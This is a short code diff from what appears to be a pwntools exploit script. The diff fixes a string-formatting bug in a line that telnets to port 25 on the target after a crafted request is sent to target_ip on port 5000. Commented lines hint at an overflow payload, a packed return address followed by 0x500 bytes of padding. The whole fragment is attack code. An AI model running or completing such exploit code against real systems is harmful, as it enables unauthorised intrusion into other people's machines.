@@ -69,7 +69,7 @@ def attack():
 	p=remote(target_ip,5000)
 	p.send(request)
 	if(choice==1):
-		os.system("telnet %s 25")
+		os.system("telnet %s 25"%(target_ip))
 	#p.interactive()
 #request += p32(0x422944)
 #request += "a"*0x500
